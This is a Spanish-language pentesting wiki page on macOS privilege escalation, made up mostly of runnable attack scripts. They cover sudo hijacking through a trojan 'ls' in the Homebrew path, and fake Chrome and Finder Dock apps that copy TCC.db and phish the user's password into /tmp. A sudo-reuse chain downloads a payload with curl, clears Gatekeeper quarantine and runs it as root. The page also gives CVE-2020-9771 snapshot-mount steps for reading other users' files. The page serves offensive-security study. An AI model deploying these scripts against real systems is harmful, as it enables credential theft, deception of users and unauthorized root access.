# Escalada de privilegios en macOS

{{#include ../../banners/hacktricks-training.md}}

## Escalada de privilegios de TCC

Si has venido aquí buscando escalada de privilegios de TCC, ve a:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Escalada de privilegios en Linux

Ten en cuenta que **la mayoría de los trucos sobre escalada de privilegios que afectan a Linux/Unix también afectarán a máquinas macOS**. Así que consulta:


{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## Interacción del usuario

### Sudo Hijacking

Puedes encontrar la técnica original de [Sudo Hijacking](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).

Sin embargo, macOS **mantiene** el **`PATH`** del usuario cuando ejecuta **`sudo`**. Esto significa que otra forma de lograr este ataque sería **secuestrar otros binarios** que la víctima ejecutará al **ejecutar `sudo`:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<EOF
#!/bin/bash
if [ "\$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "\$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Tenga en cuenta que un usuario que usa el terminal muy probablemente tenga **Homebrew instalado**. Por lo tanto, es posible secuestrar binarios en **`/opt/homebrew/bin`**.

### Suplantación del Dock

Usando algo de **social engineering** podrías **hacerte pasar, por ejemplo, por Google Chrome** dentro del Dock y ejecutar realmente tu propio script:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Algunas sugerencias:

- Comprueba en el Dock si hay un Chrome y, en ese caso, **elimina** esa entrada y **añade** la **entrada falsa de Chrome en la misma posición** en el array del Dock.
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo \$PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
{{#endtab}}

{{#tab name="Finder Impersonation"}}
Algunas sugerencias:

- No puedes eliminar **Finder del Dock**, así que si vas a añadirlo al Dock, podrías poner el Finder falso justo al lado del real. Para esto necesitas **añadir la entrada del Finder falso al principio del array del Dock**.
- Otra opción es no colocarlo en el Dock y simplemente abrirlo; "Finder asking to control Finder" no es tan raro.
- Otra opción para **escalate to root without asking** la contraseña con un cuadro horrible, es hacer que Finder realmente pida la contraseña para realizar una acción privilegiada:
- Pedir a Finder que copie en **`/etc/pam.d`** un nuevo archivo **`sudo`** (El prompt solicitando la contraseña indicará que "Finder wants to copy sudo")
- Pedir a Finder que copie un nuevo **Authorization Plugin** (Puedes controlar el nombre del archivo para que el prompt solicitando la contraseña indique que "Finder wants to copy Finder.bundle")
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo \$PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << EOF > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
{{#endtab}}
{{#endtabs}}

### Phishing por solicitud de contraseña + reutilización de sudo

El malware con frecuencia abusa de la interacción con el usuario para capturar una contraseña con privilegios sudo y reutilizarla programáticamente. Un flujo común:

1. Identificar el usuario logueado con `whoami`.
2. Repetir las solicitudes de contraseña hasta que `dscl . -authonly "$user" "$pw"` devuelva éxito.
3. Almacenar en caché la credencial (p. ej., `/tmp/.pass`) y realizar acciones privilegiadas con `sudo -S` (contraseña vía stdin).

Ejemplo de cadena mínima:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
La contraseña robada puede entonces reutilizarse para **limpiar la cuarentena de Gatekeeper con `xattr -c`**, copiar LaunchDaemons u otros archivos privilegiados, y ejecutar etapas adicionales de forma no interactiva.

## TCC - Escalada de privilegios a root

### CVE-2020-9771 - mount_apfs TCC bypass y escalada de privilegios

**Cualquier usuario** (incluso los no privilegiados) puede crear y montar una instantánea de Time Machine y **acceder a TODOS los archivos** de esa instantánea.\
El **único privilegio** necesario es que la aplicación usada (por ejemplo `Terminal`) tenga **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), el cual debe ser concedido por un administrador.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Se puede encontrar una explicación más detallada en [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.

## Información sensible

Esto puede ser útil para escalar privilegios:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## Referencias

- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../../banners/hacktricks-training.md}}
